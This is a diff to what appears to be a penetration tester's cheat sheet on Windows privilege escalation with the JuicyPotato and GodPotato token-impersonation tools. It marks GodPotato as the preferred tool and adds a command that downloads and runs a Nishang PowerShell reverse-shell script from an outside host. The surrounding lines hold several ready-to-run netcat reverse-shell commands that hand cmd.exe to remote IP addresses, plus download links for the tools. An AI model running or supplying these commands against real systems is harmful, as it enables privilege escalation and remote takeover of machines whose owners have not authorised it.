@@ -589,7 +589,7 @@ SeAssignPrimaryTokenPrivilege
 Use impersonation exploits (e.g., token impersonation techniques). \
 SeImpersonatePrivilege -> PrintSpoofer64.exe and GodPotato
 
-## Get JuicyPotato
+## Get JuicyPotato (Legacy)
 
 Get the exe from: https://github.com/ohpe/juicy-potato/releases
 Get the netcat exe from: https://github.com/int0x33/nc.exe/
@@ -598,7 +598,7 @@ Get the netcat exe from: https://github.com/int0x33/nc.exe/
 .\JuicyPotato.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c C:\Users\bruce\Desktop\nc64.exe 10.128.66.134 5555 -e cmd.exe" -t "*" -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
 ```
 
-## Get GodPotato
+## Get GodPotato (Use this)
 
 Link: https://github.com/BeichenDream/GodPotato?source=post_page-----10b91a94c580---------------------------------------
 
@@ -608,6 +608,11 @@ GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
 
 ```
 .\GodPotato-NET4.exe -cmd "C:\Users\Public\nc.exe -e cmd.exe 10.130.85.61 1234"
+```
+
+Reverse shell with Nishang powershell
+```
+./GodPotato-NET4.exe -cmd "powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.15.236:8000/Invoke-PowerShellTcp.ps1')"
 ```
 
 Donwload nc.exe from https://github.com/int0x33/nc.exe/blob/master/nc.exe?source=post_page-----10b91a94c580---------------------------------------
